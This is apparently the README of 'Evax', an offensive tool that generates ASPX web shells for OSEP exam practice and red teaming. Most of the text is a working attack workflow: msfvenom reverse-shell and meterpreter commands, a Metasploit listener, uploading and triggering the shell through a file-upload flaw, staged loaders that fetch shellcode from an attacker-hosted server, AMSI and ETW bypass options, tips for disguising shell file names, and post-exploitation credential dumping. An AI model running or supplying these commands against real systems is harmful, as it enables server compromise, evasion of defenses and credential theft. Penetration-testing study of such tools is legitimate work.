# Evax - Advanced ASPX Web Shell Generator

```
███████╗██╗   ██╗ █████╗ ██╗  ██╗
██╔════╝██║   ██║██╔══██╗╚██╗██╔╝
█████╗  ██║   ██║███████║ ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝██╔══██║ ██╔██╗ 
███████╗ ╚████╔╝ ██║  ██║██╔╝ ██╗
╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝

    "Evasion + Execution = Evax"
    
    Author: Abdulrahman Albalawi
    Version: 2.0.0 (2026 Edition)
```

## Overview

**Evax** is an advanced ASPX web shell generator designed for OSEP exam preparation and red team operations. It combines multiple evasion techniques to bypass modern AV/EDR solutions while maintaining reliability and ease of use.

### Why "Evax"?

- **Eva**sion + E**x**ecution = **Evax**
- Smart, short, memorable
- Represents the core purpose: Evade detection, Execute payload

---

## Features

| Feature | Description |
|---------|-------------|
| **Multi-Layer Encryption** | Caesar, XOR, Multi-byte XOR, RC4 |
| **Sandbox Evasion** | VirtualAllocExNuma, Sleep timers, Resource checks |
| **AMSI Bypass** | Integrated AMSI patching for PowerShell-based defenses |
| **ETW Patching** | Disable Event Tracing for Windows |
| **Polymorphic Code** | Randomized variable names every generation |
| **Multiple Payloads** | Meterpreter, Shell, Staged/Stageless |
| **Evasion Levels** | Low, Medium, Max - choose your stealth level |

---

## Installation

```bash
# Clone or download evax.py
chmod +x evax.py

# No additional dependencies required (Python 3 standard library)
# msfvenom required for payload generation (part of Metasploit)
```

---

## Quick Start

### Basic Usage

```bash
# Generate shell with default settings (Caesar encryption, medium evasion)
python3 evax.py -i 192.168.1.100 -p 443
```

### Maximum Evasion

```bash
# Full evasion with AMSI bypass and ETW patch
python3 evax.py -i 192.168.1.100 -p 443 --evasion max --amsi --etw
```

### Different Encryption

```bash
# RC4 encryption (stronger)
python3 evax.py -i 192.168.1.100 -p 443 -e rc4

# Multi-byte XOR
python3 evax.py -i 192.168.1.100 -p 443 -e xor_multi
```

---

## Command Reference

```
usage: evax.py [-h] -i LHOST -p LPORT [-o OUTPUT] [-e {caesar,xor,xor_multi,rc4}]
               [-k KEY] [--evasion {low,medium,max}] [--amsi] [--etw]
               [--payload {meterpreter_https,meterpreter_http,meterpreter_tcp,shell_tcp}]
               [--shellcode SHELLCODE] [--staged] [--url URL]

options:
  -h, --help            Show help message
  -i, --lhost           Listener IP address (required)
  -p, --lport           Listener port (required)
  -o, --output          Output filename (default: shell.aspx)
  -e, --encryption      Encryption method: caesar, xor, xor_multi, rc4
  -k, --key             Encryption key (auto-generated if not specified)
  --evasion             Evasion level: low, medium, max
  --amsi                Include AMSI bypass
  --etw                 Include ETW patch
  --payload             Payload type (default: meterpreter_https)
  --shellcode           Use shellcode from file
  --staged              Generate staged loader
  --url                 URL for staged payload
```

---

## Encryption Methods

### 1. Caesar Cipher (Default)

Simple but effective against signature-based detection.

```bash
python3 evax.py -i 192.168.1.100 -p 443 -e caesar -k 13
```

**How it works:**
- Each byte is shifted by the key value
- Fast runtime decryption
- Low overhead

### 2. XOR (Single Byte)

Classic XOR encryption with single byte key.

```bash
python3 evax.py -i 192.168.1.100 -p 443 -e xor -k 171
```

### 3. XOR Multi-byte

XOR with 16-byte random key for stronger encryption.

```bash
python3 evax.py -i 192.168.1.100 -p 443 -e xor_multi
```

**Advantages:**
- Harder to detect patterns
- Each byte encrypted differently
- Auto-generated random key

### 4. RC4 (Strongest)

Stream cipher encryption, most evasive option.

```bash
python3 evax.py -i 192.168.1.100 -p 443 -e rc4
```

**Advantages:**
- Industry-standard stream cipher
- Variable-length key
- Excellent for AV bypass

---

## Evasion Levels

### Low (`--evasion low`)

- VirtualAllocExNuma sandbox check only
- Minimal overhead
- For weakly protected targets

### Medium (`--evasion medium`) - Default

- VirtualAllocExNuma check
- Sleep timer verification
- Processor count check
- Balanced stealth/performance

### Max (`--evasion max`)

- All medium checks plus:
- Username validation (sandbox names)
- VM file detection
- Domain environment check
- Maximum stealth

```bash
# Maximum evasion example
python3 evax.py -i 192.168.1.100 -p 443 --evasion max --amsi --etw -e rc4
```

---

## Advanced Options

### AMSI Bypass (`--amsi`)

Patches AMSI to prevent PowerShell-based detection.

```bash
python3 evax.py -i 192.168.1.100 -p 443 --amsi
```

### ETW Patch (`--etw`)

Disables Event Tracing for Windows to avoid logging.

```bash
python3 evax.py -i 192.168.1.100 -p 443 --etw
```

### Staged Payload (`--staged`)

Downloads shellcode at runtime instead of embedding.

```bash
# Generate staged loader
python3 evax.py -i 192.168.1.100 -p 443 --staged --url http://192.168.1.100/shell.bin

# Then generate the raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f raw -o shell.bin

# Host it
python3 -m http.server 80
```

### Custom Shellcode (`--shellcode`)

Use pre-generated shellcode file.

```bash
# Generate custom shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o custom.bin

# Use with Evax
python3 evax.py -i 192.168.1.100 -p 4444 --shellcode custom.bin
```

---

## Payload Types

| Type | Description | Command |
|------|-------------|---------|
| `meterpreter_https` | HTTPS Meterpreter (default, recommended) | `--payload meterpreter_https` |
| `meterpreter_http` | HTTP Meterpreter | `--payload meterpreter_http` |
| `meterpreter_tcp` | TCP Meterpreter | `--payload meterpreter_tcp` |
| `shell_tcp` | Simple reverse shell | `--payload shell_tcp` |

---

## Usage Examples

### Example 1: OSEP Exam Scenario

```bash
# Maximum stealth for exam
python3 evax.py -i 192.168.119.120 -p 443 \
    --evasion max \
    --amsi \
    --etw \
    -e rc4 \
    -o backdoor.aspx
```

### Example 2: Quick Test Shell

```bash
# Fast generation for testing
python3 evax.py -i 10.10.14.5 -p 4444 \
    --payload shell_tcp \
    --evasion low
```

### Example 3: Staged HTTPS Shell

```bash
# Generate staged loader
python3 evax.py -i 192.168.1.100 -p 443 \
    --staged \
    --url http://192.168.1.100:8080/payload.bin \
    -o loader.aspx

# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -f raw -o payload.bin

# Host payload
cd /path/to/payload
python3 -m http.server 8080
```

### Example 4: Custom Output Name

```bash
# Disguise as image handler
python3 evax.py -i 192.168.1.100 -p 443 -o image_handler.aspx

# Or as error page
python3 evax.py -i 192.168.1.100 -p 443 -o error_404.aspx
```

---

## Complete Attack Workflow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     EVAX ATTACK WORKFLOW                                 │
└─────────────────────────────────────────────────────────────────────────┘

STEP 1: RECONNAISSANCE
──────────────────────
• Identify file upload vulnerability
• Confirm .NET/ASPX support
• Find upload directory location

    gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt


STEP 2: GENERATE PAYLOAD
────────────────────────
    python3 evax.py -i 192.168.119.120 -p 443 --evasion max --amsi -e rc4

    Output:
    [+] Shellcode generated! Size: 691 bytes
    [+] Web shell generated: shell.aspx
    [+] File size: 4521 bytes


STEP 3: START LISTENER
──────────────────────
    msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/x64/meterpreter/reverse_https; \
    set LHOST 192.168.119.120; \
    set LPORT 443; \
    set EXITFUNC thread; \
    run"


STEP 4: UPLOAD SHELL
────────────────────
    • Use web application upload function
    • Or curl if direct upload available:
    
    curl -F "file=@shell.aspx" http://TARGET/upload.aspx


STEP 5: TRIGGER EXECUTION
─────────────────────────
    curl http://TARGET/upload/shell.aspx
    
    • Browse to uploaded file location
    • Shell executes on page load


STEP 6: RECEIVE SESSION
───────────────────────
    [*] Started HTTPS reverse handler on https://192.168.119.120:443
    [*] https://192.168.119.120:443 handling request from 10.10.10.50
    [*] Meterpreter session 1 opened

    meterpreter > getuid
    Server username: IIS APPPOOL\DefaultAppPool

    meterpreter > sysinfo
    Computer        : WEB01
    OS              : Windows Server 2019
```

---

## Comparison: Evax vs Other Tools

| Feature | Evax | AspXVenom | msfvenom ASPX |
|---------|------|-----------|---------------|
| Encryption Options | 4 (Caesar/XOR/XOR-Multi/RC4) | 2 | 0 |
| Sandbox Evasion | ✅ Multiple | ✅ Basic | ❌ |
| AMSI Bypass | ✅ | ❌ | ❌ |
| ETW Patch | ✅ | ❌ | ❌ |
| Polymorphic Variables | ✅ | ✅ | ❌ |
| Evasion Levels | 3 | 1 | 0 |
| Staged Payloads | ✅ | ❌ | ❌ |
| Custom Shellcode | ✅ | ✅ | ❌ |

---

## Troubleshooting

### Problem: AV Still Detecting

```bash
# Try different encryption
python3 evax.py -i IP -p PORT -e rc4

# Increase evasion level
python3 evax.py -i IP -p PORT --evasion max --amsi --etw

# Use staged payload
python3 evax.py -i IP -p PORT --staged --url http://IP/shell.bin
```

### Problem: Shell Connects Then Dies

```bash
# Use EXITFUNC thread and AutoMigrate in listener
set EXITFUNC thread
set AutoRunScript post/windows/manage/migrate
```

### Problem: 404 After Upload

```bash
# Find correct upload directory
gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt

# Check common paths: /upload/, /uploads/, /files/, /documents/
```

### Problem: msfvenom Not Found

```bash
# Install Metasploit Framework
sudo apt update && sudo apt install metasploit-framework -y
```

---

## Tips for OSEP Exam

```
1. PRE-GENERATE SHELLS
   Create shells with different evasion levels before exam starts
   
2. TEST LOCALLY FIRST
   Always verify shell works before uploading to target
   
3. USE HTTPS (443)
   More likely to bypass firewall rules
   
4. TRY MULTIPLE ENCRYPTIONS
   If Caesar fails, try RC4 or staged
   
5. DOCUMENT EVERYTHING
   Screenshot successful shells and note what worked
   
6. BACKUP LISTENER
   Keep Metasploit running in tmux session
   
7. POST-EXPLOITATION
   - Migrate immediately after shell
   - Run getsystem for privesc
   - Dump creds with hashdump/kiwi
```

---

## Output Example

```
$ python3 evax.py -i 192.168.119.120 -p 443 --evasion max --amsi -e rc4

███████╗██╗   ██╗ █████╗ ██╗  ██╗
██╔════╝██║   ██║██╔══██╗╚██╗██╔╝
█████╗  ██║   ██║███████║ ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝██╔══██║ ██╔██╗ 
███████╗ ╚████╔╝ ██║  ██║██╔╝ ██╗
╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝

    ╔══════════════════════════════════════════════════════════╗
    ║     Advanced ASPX Web Shell Generator with AV/EDR Bypass  ║
    ║                  "Evasion + Execution = Evax"             ║
    ╠══════════════════════════════════════════════════════════╣
    ║  Author  : Abdulrahman Albalawi                           ║
    ║  Version : 2.0.0 (2026 Edition)                           ║
    ║  Purpose : OSEP Exam & Red Team Operations                ║
    ╚══════════════════════════════════════════════════════════╝

[*] Generating shellcode with msfvenom...
[*] Payload: windows/x64/meterpreter/reverse_https
[*] LHOST: 192.168.119.120
[*] LPORT: 443
[+] Shellcode generated! Size: 691 bytes
[*] Encryption: rc4
[*] Evasion level: max
[*] AMSI bypass: Enabled
[+] Web shell generated: shell.aspx
[+] File size: 5234 bytes

======================================================================
LISTENER SETUP:
======================================================================

[Metasploit Handler]
msfconsole -q -x "use exploit/multi/handler; \
set payload windows/x64/meterpreter/reverse_https; \
set LHOST 192.168.119.120; \
set LPORT 443; \
set EXITFUNC thread; \
set AutoRunScript post/windows/manage/migrate; \
run"

======================================================================
USAGE INSTRUCTIONS:
======================================================================

[1] Start your listener (see above)

[2] Upload shell.aspx to target web application

[3] Browse to trigger execution:
    curl http://TARGET/upload/shell.aspx

[4] Receive your shell!

[*] Happy Hacking! - Evax by Abdulrahman Albalawi
```

---

## License & Disclaimer

**For authorized security testing and educational purposes only.**

The author (Abdulrahman Albalawi) is not responsible for any misuse of this tool. Always obtain proper authorization before testing.

---

## Author

**Abdulrahman Albalawi**
- Tool: Evax v2.0.0
- Year: 2026
- Purpose: OSEP Exam & Red Team Operations

*"When AV says no, Evax says yes"*
